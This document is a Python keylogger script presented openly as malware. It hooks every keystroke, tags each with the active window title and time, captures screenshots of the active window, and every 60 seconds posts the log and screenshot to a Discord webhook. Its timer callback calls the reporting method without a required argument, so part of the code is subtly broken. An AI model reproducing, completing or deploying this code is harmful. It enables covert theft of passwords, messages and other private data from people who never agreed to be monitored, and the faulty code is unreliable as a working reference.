from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta
from threading import Timer
import requests
import pygetwindow as gw
import pyautogui
from io import BytesIO

WEBHOOK_URL = 'Insert your discord webhook here'
LOG_FILE_PATH = 'keylogger_log.txt' # You can rename to whatever

class Keylogger:
    def __init__(self, webhook_url):
        self.start_time = datetime.now()
        self.webhook_url = webhook_url
        self.current_window = None
        self.current_content = ''

    def _get_active_window_info(self):
        try:
            import ctypes
            import ctypes.wintypes

            GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
            GetWindowText = ctypes.windll.user32.GetWindowTextW
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW

            hwnd = GetForegroundWindow()
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)

            active_window_info = buff.value
            print(f"Active Window Info: {active_window_info}")  # Print the active window info
            return active_window_info
        except Exception as e:
            print(f"Error getting active window info: {e}")
            return None

    def _capture_screen(self):
        try:
            active_window = gw.getActiveWindow()
            screenshot = pyautogui.screenshot(
                region=(active_window.left, active_window.top, active_window.width, active_window.height)
            )
            screenshot_byte_array = BytesIO()
            screenshot.save(screenshot_byte_array, format="PNG")
            return screenshot_byte_array.getvalue()
        except Exception as e:
            print(f"Error capturing screen: {e}")
            return None

    def _send_message(self, message, screenshot=None):
        try:
            files = {'file': ('screenshot.png', screenshot, 'image/png')} if screenshot else None
            data = {'content': message}
            requests.post(self.webhook_url, files=files, data=data)
        except Exception as e:
            print(f"Error sending message: {e}")

    def _report(self, active_window_info):
        try:
            screenshot = self._capture_screen()
            log_content = self._read_log_file()
            message = "Service started\n" + log_content
            if self.current_window:
                self._send_message(message, screenshot)
                self._clear_log_file()
        except Exception as e:
            print(f"Error printing/log: {e}")

        # Set current window to the new window
        self.current_window = active_window_info

    def _on_key_press(self, key):
        try:
            active_window_info = self._get_active_window_info()
            content = self._convert_key_to_string(key)
            self._write_to_log_file(active_window_info, content)
        except AttributeError:
            # Handle special keys
            active_window_info = self._get_active_window_info()
            content = str(key)
            self._write_to_log_file(active_window_info, content)

    def _convert_key_to_string(self, key):
        if hasattr(key, 'char'):
            return key.char
        elif key == Key.space:
            return ' '
        elif key == Key.shift:
            return 'Key.shift'
        else:
            return str(key).replace('Key.', '')

    def _timer_callback(self):
        self._report()
        # Schedule the next report after 60 seconds
        Timer(60, self._timer_callback).start()

    def _send_initial_message(self):
        initial_message = "Service started"
        print(initial_message)
        self._send_message(initial_message)

    def _write_to_log_file(self, active_window_info, content):
        try:
            with open(LOG_FILE_PATH, 'a') as log_file:
                if active_window_info != self.current_window:
                    if self.current_content:
                        log_file.write(f"Content: {self.current_content}\n")
                    if self.current_window:
                        log_file.write("\n")
                    log_file.write(f"App: {active_window_info}\nTime: {datetime.now().strftime('%I:%M %p')}\n")
                    self.current_window = active_window_info
                    self.current_content = content
                else:
                    self.current_content += content
        except Exception as e:
            print(f"Error writing to log file: {e}")

    def _read_log_file(self):
        try:
            with open(LOG_FILE_PATH, 'r') as log_file:
                return log_file.read()
        except Exception as e:
            print(f"Error reading log file: {e}")
            return ""

    def _clear_log_file(self):
        try:
            with open(LOG_FILE_PATH, 'w'):
                pass  # Clear the contents of the log file
        except Exception as e:
            print(f"Error clearing log file: {e}")

    def run(self):
        try:
            # Initial report when the script starts
            self._send_initial_message()

            # Schedule the first report after 60 seconds
            Timer(60, self._timer_callback).start()

            with Listener(on_press=self._on_key_press) as listener:
                listener.join()
        except Exception as e:
            print(f"Error in Keylogger run: {e}")

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL).run()
